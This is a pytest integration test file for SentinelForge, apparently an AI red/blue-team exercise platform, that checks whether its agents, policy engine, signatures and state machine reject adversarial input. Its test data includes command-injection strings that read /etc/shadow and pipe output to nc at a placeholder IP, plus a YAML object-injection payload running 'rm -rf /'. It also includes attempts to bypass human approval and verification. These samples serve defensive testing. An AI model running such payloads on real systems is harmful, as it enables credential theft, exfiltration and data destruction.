"""SentinelForge Integration Tests — Security Adversarial & Attack Boundary Testing

Actively tests adversarial attempts to bypass Red Agent safety boundary, PolicyEngine,
HMAC blueprint signatures, replay protection, Blue Agent validation, and state machine invariants.

SECURITY INVARIANT: EVERY ATTACK ATTEMPT MUST FAIL CLOSED.
"""

from datetime import datetime, timedelta, timezone
from uuid import uuid4
import pytest

from sentinelforge.agents.blue_agent import (
    BlueAgentAnalyst,
    GapAnalysisResult,
    RuleValidationSandbox,
    SigmaRuleValidator,
)
from sentinelforge.agents.red_agent import RedAgentPlanner
from sentinelforge.detection.evaluator import DetectionGapEvaluator
from sentinelforge.detection.normalizer import NormalizedEvent
from sentinelforge.detection.sigma_engine import DetectionOutcome, SigmaEngine
from sentinelforge.domain.action_ir import ActionIR, ActionType

from sentinelforge.domain.exceptions import SecurityRejection, SecurityRejectionCode
from sentinelforge.domain.experiment import (
    AdversarialScenario,
    CandidateSigmaRule,
    ExperimentConstraints,
    PolicyDecisionStatus,
    RetestResult,
    RiskLevel,
    SecurityObjective,
    ValidationSandboxResult,
    ValidationSandboxStatus,
)
from sentinelforge.domain.state_machine import ExerciseStateMachine
from sentinelforge.policy.engine import PolicyEngine
from sentinelforge.policy.safety_boundary import ExperimentSafetyBoundary
from sentinelforge.policy.signing import BlueprintSigner

pytestmark = [pytest.mark.integration]


@pytest.fixture
def test_signer():
    return BlueprintSigner(key="sentinelforge-adv-secret", key_id="key-adv")


@pytest.fixture
def mock_objective():
    return SecurityObjective(
        objective_id=uuid4(),
        organization_id=uuid4(),
        title="Adversarial Attack Testing Objective",
        description="Objective for security boundary stress testing",
    )


# ---------------------------------------------------------------------------
# Red Agent & Safety Boundary Adversarial Tests
# ---------------------------------------------------------------------------


def test_adv_red_agent_command_injection_rejected(mock_objective):
    """Test RedAgentPlanner rejects command injection payloads."""
    planner = RedAgentPlanner()

    injection_payloads = [
        "whoami; cat /etc/passwd",
        "whoami && cat /etc/shadow",
        "$(whoami)",
        "whoami | nc 10.0.0.1 4444",
        "whoami\ncat /etc/shadow",
    ]

    for payload in injection_payloads:
        res = planner.plan_scenario(
            objective=mock_objective,
            custom_command={"executable": "/usr/bin/bash", "arguments": ["-c", payload], "technique_ids": ["T1059.004"]},
        )
        assert res.is_allowed is False
        assert res.policy_decision.status == PolicyDecisionStatus.DENIED
        assert len(res.signed_blueprints) == 0


def test_adv_red_agent_unauthorized_user_and_target_rejected(mock_objective):
    """Test RedAgentPlanner rejects unauthorized user identity and target host."""
    planner = RedAgentPlanner()

    # Unauthorized user root
    res_root = planner.plan_scenario(
        objective=mock_objective,
        custom_command={"run_as_user": "root", "executable": "/usr/bin/bash", "arguments": ["-c", "whoami"]},
    )
    assert res_root.is_allowed is False
    assert len(res_root.signed_blueprints) == 0

    # Unauthorized target host
    res_host = planner.plan_scenario(
        objective=mock_objective,
        custom_command={"target": "production-db-server", "executable": "/usr/bin/bash", "arguments": ["-c", "whoami"]},
    )
    assert res_host.is_allowed is False
    assert len(res_host.signed_blueprints) == 0


def test_adv_red_agent_risk_ceiling_exceeded(mock_objective):
    """Test RedAgentPlanner rejects scenario proposing risk above ExperimentConstraints max ceiling."""
    planner = RedAgentPlanner()
    strict_constraints = ExperimentConstraints(max_risk_level=RiskLevel.LOW)

    res = planner.plan_scenario(
        objective=mock_objective,
        strategy_type="credential_dump_shadow",  # High risk strategy
        constraints=strict_constraints,
    )
    assert res.is_allowed is False
    assert res.policy_decision.status == PolicyDecisionStatus.DENIED
    assert "exceeds maximum permitted risk" in res.policy_decision.reason
    assert len(res.signed_blueprints) == 0


def test_adv_red_agent_human_approval_bypass_attempt(mock_objective):
    """Test human approval escalation gate cannot be bypassed."""
    planner = RedAgentPlanner()
    approval_constraints = ExperimentConstraints(requires_human_approval=True)

    # Without human approval flag -> ESCALATED
    res_unapproved = planner.plan_scenario(
        objective=mock_objective,
        strategy_type="bash_exec_whoami",
        constraints=approval_constraints,
        is_human_approved=False,
    )
    assert res_unapproved.is_allowed is False
    assert res_unapproved.policy_decision.status == PolicyDecisionStatus.ESCALATED
    assert len(res_unapproved.signed_blueprints) == 0

    # With human approval flag -> ALLOWED
    res_approved = planner.plan_scenario(
        objective=mock_objective,
        strategy_type="bash_exec_whoami",
        constraints=approval_constraints,
        is_human_approved=True,
    )
    assert res_approved.is_allowed is True
    assert len(res_approved.signed_blueprints) == 1


# ---------------------------------------------------------------------------
# SignedBlueprint & Signature Adversarial Tests
# ---------------------------------------------------------------------------


def test_adv_blueprint_payload_and_signature_tampering(test_signer):
    """Test tampered signed blueprint payload or signature fails verification."""
    now = datetime.now(timezone.utc)
    bp = test_signer.sign(
        blueprint_id=uuid4(),
        action_id=uuid4(),
        technique_id="T1059.004",
        target="sentinelforge-target",
        executable="/usr/bin/bash",
        arguments=["-c", "whoami"],
        run_as_user="labuser",
        issued_at=now,
        expires_at=now + timedelta(minutes=5),
    )

    assert test_signer.verify(bp) is True

    # Tamper target
    bp_target_tampered = bp.model_copy()
    bp_target_tampered.target = "hacked-host"
    assert test_signer.verify(bp_target_tampered) is False

    # Tamper arguments
    bp_arg_tampered = bp.model_copy()
    bp_arg_tampered.arguments = ["-c", "cat /etc/shadow"]
    assert test_signer.verify(bp_arg_tampered) is False

    # Tamper signature string directly
    bp_sig_tampered = bp.model_copy()
    bp_sig_tampered.hmac_signature = "a" * 64
    assert test_signer.verify(bp_sig_tampered) is False



def test_adv_blueprint_expiration_and_future_skew(test_signer):
    """Test expired or future-issued blueprint fails PolicyEngine validation."""
    now = datetime.now(timezone.utc)

    # Expired blueprint
    expired_ir = ActionIR(
        action_id=uuid4(),
        blueprint_id=uuid4(),
        technique_id="T1059.004",
        action_type=ActionType.PROCESS_EXEC,
        target="sentinelforge-target",
        run_as_user="labuser",
        executable="/usr/bin/bash",
        arguments=["-c", "whoami"],
        issued_at=now - timedelta(minutes=10),
        expires_at=now - timedelta(minutes=5),
    )
    with pytest.raises(SecurityRejection) as exc1:
        PolicyEngine.validate(expired_ir, current_time=now)
    assert exc1.value.code == SecurityRejectionCode.EXPIRED_BLUEPRINT

    # Future-issued blueprint beyond 5s skew
    future_ir = ActionIR(
        action_id=uuid4(),
        blueprint_id=uuid4(),
        technique_id="T1059.004",
        action_type=ActionType.PROCESS_EXEC,
        target="sentinelforge-target",
        run_as_user="labuser",
        executable="/usr/bin/bash",
        arguments=["-c", "whoami"],
        issued_at=now + timedelta(seconds=10),
        expires_at=now + timedelta(minutes=5),
    )
    with pytest.raises(SecurityRejection) as exc2:
        PolicyEngine.validate(future_ir, current_time=now)
    assert exc2.value.code == SecurityRejectionCode.INVALID_ACTION_IR


# ---------------------------------------------------------------------------
# Blue Agent & Validation Sandbox Adversarial Tests
# ---------------------------------------------------------------------------


def test_adv_blue_agent_malicious_yaml_payload():
    """Test Blue Agent rejects malicious YAML object injection payloads."""
    malicious_yaml = """
title: Malicious Payload Injection
id: 1234
logsource:
  category: process_creation
  product: linux
detection: !!python/object/apply:os.system ['rm -rf /']
x-sentinelforge:
  scenario_id: sc-1
  action_ids: [act-1]
  technique_id: T1003.008
  rule_id: 1234
"""
    with pytest.raises(ValueError):
        SigmaRuleValidator.validate_yaml(malicious_yaml)


def test_adv_blue_agent_overly_broad_rule_rejection():
    """Test Blue Agent rejects bare process_name=bash broad detection rule."""
    rule = CandidateSigmaRule(
        rule_id=str(uuid4()),
        title="Broad Bash Matcher",
        description="Matches all shell processes",
        technique_id="T1059.004",
        logsource={"category": "process_creation", "product": "linux"},
        detection={"selection": {"ProcessName": "bash"}, "condition": "selection"},
        source_scenario_id=str(uuid4()),
        source_action_ids=[str(uuid4())],
    )

    sandbox = RuleValidationSandbox()
    res = sandbox.validate_candidate_rule(rule, [], [])
    assert res.status == ValidationSandboxStatus.REJECTED
    assert "Overly broad rule rejected" in res.reason


def test_adv_blue_agent_missing_provenance_rejection():
    """Test CandidateSigmaRule with missing provenance fails validation."""
    rule_no_scenario = CandidateSigmaRule(
        rule_id=str(uuid4()),
        title="No Scenario Rule",
        description="Missing scenario ID",
        technique_id="T1003.008",
        logsource={"category": "process_creation", "product": "linux"},
        detection={"selection": {"CommandLine|contains": "shadow"}, "condition": "selection"},
        source_scenario_id="",  # Empty
        source_action_ids=[str(uuid4())],
    )

    validator = SigmaRuleValidator()
    is_valid, msg = validator.validate_candidate_rule(rule_no_scenario)
    assert is_valid is False
    assert "Missing provenance" in msg


def test_adv_verified_state_transition_bypass_rejected(mock_objective):
    """Test ExerciseStateMachine strictly rejects attempts to reach VERIFIED without valid RetestResult."""
    # Attempt 1: bare boolean True
    with pytest.raises(SecurityRejection) as exc1:
        ExerciseStateMachine.transition("RETESTING", "VERIFIED", has_retest_result=True)
    assert exc1.value.code == SecurityRejectionCode.VERIFICATION_FAILED

    # Attempt 2: missing retest_result
    with pytest.raises(SecurityRejection) as exc2:
        ExerciseStateMachine.transition("RETESTING", "VERIFIED", has_retest_result=False)
    assert exc2.value.code == SecurityRejectionCode.VERIFICATION_FAILED

    # Attempt 3: RetestResult claiming improvement when before_outcome was DETECTED
    fake_before = RetestResult(
        retest_id=uuid4(),
        organization_id=mock_objective.organization_id,
        scenario_id=uuid4(),
        before_outcome="DETECTED",
        after_outcome="DETECTED",
        detection_improved=True,
    )
    with pytest.raises(SecurityRejection) as exc3:
        ExerciseStateMachine.transition("RETESTING", "VERIFIED", retest_result=fake_before)
    assert exc3.value.code == SecurityRejectionCode.VERIFICATION_FAILED


# ---------------------------------------------------------------------------
# Telemetry & Scenario Isolation Adversarial Tests
# ---------------------------------------------------------------------------


def test_adv_cross_scenario_telemetry_isolation():
    """Test telemetry from scenario A is isolated and cannot be used as evidence for scenario B."""
    evaluator = DetectionGapEvaluator()
    sigma = SigmaEngine()

    scen_a_id = str(uuid4())
    scen_b_id = str(uuid4())

    act_b = ActionIR(
        action_id=uuid4(),
        blueprint_id=uuid4(),
        technique_id="T1003.008",
        action_type=ActionType.PROCESS_EXEC,
        target="sentinelforge-target",
        executable="/usr/bin/bash",
        arguments=["-c", "cat /etc/shadow"],
        issued_at=datetime.now(timezone.utc),
        expires_at=datetime.now(timezone.utc) + timedelta(minutes=5),
    )

    # Event belonging to Scenario A
    ev_scen_a = NormalizedEvent(
        event_id=str(uuid4()),
        correlation_id=scen_a_id,  # Scenario A!
        timestamp=datetime.now(timezone.utc).isoformat() + "Z",
        source="linux_auditd",
        EventType="execve",
        ProcessName="cat",
        Executable="/usr/bin/cat",
        CommandLine="cat /etc/shadow",
        UserName="labuser",
        UserUid=1000,
        TargetFile="/etc/shadow",
        ContainerName="sentinelforge-target",
        ContainerId="c1",
        ParentProcess="bash",
        raw_event_hash="hash_scen_a",
    )

    # Evaluate Scenario B using Scenario A's telemetry
    outcome_b = evaluator.evaluate_scenario(
        scenario_id=scen_b_id,
        actions=[act_b],
        events=[ev_scen_a],
        sigma_engine=sigma,
    )

    # Scenario B MUST report DETECTION_GAP because Event A belonged to Scenario A
    assert outcome_b.overall_outcome == DetectionOutcome.DETECTION_GAP
    assert len(outcome_b.gap_action_ids) == 1
    assert outcome_b.gap_action_ids[0] == str(act_b.action_id)
